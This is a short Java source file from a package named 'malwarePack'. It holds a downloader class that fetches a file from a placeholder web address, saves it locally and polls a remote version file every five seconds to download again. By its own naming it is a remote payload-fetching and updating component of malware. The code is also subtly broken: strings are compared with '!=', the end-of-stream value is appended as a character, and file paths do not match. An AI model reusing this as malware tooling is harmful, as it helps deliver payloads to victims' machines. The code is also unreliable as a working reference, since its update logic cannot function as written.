package malwarePack;

import java.io.*;
import java.net.*;

public class DownloadCode {
	String url;
	String local;
	String version;
	public DownloadCode(String link, String localdireccion) {
		url = link;
		version = url+"version";
		local = localdireccion;
	}
	private void wget() throws IOException {
		URL imagen = new URL(url);
		InputStream reader = imagen.openStream();
		FileWriter file = new FileWriter(local);
		String texto = read(reader);
		file.write(texto);
		file.close();
		
		URL fileVersion = new URL(version);
		InputStream readerVersion = fileVersion.openStream();
		FileWriter writeVersion = new FileWriter("/home/angrymasther/version");
		String numeroVersion = read(readerVersion);
		writeVersion.write(numeroVersion);
		writeVersion.close();
	}
	private static String read(InputStream reader) throws IOException {
		int i=0;
		String texto = "";
		while(i != -1) {
			i = reader.read();
			char caracter = (char) i;
			texto += Character.toString(caracter);
		}
		return texto;
	}
	private static String read(FileReader reader) throws IOException {
		int i=0;
		String texto = "";
		while(i != -1) {
			i = reader.read();
			char caracter = (char) i;
			texto += Character.toString(caracter);
		}
		return texto;
	}
	
	private void actualizar() throws IOException {
		while(true) {
			URL url = new URL(version);
			FileReader version = new FileReader("version");
			InputStream stream = url.openStream();
			String versionCodigo = read(stream);
			if(read(version) != versionCodigo) {
				DownloadCode code = new DownloadCode("DireccionWebImagen","DireccionDondeAlmacenarLaImagen");
				code.wget();
			}
			try{ Thread.sleep(5000); }
		catch(InterruptedException e ){}
		}
}
	public static void main(String args[]) throws IOException {
		DownloadCode code = new DownloadCode("DireccionWebImagen" , "DireccionDondeAlmacenarLaImagen");
		code.wget();
	}
	
}
